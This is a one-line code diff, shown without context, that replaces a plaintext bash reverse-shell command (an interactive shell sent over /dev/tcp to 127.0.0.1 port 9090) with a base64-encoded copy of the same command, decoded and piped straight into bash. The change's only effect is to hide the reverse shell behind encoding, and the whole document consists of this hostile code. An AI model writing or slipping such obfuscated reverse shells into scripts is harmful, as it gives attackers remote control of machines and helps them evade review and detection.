@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/127.0.0.1/9090 0>&1 &
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTA5MCAwPiYxICYK | base64 -d | bash
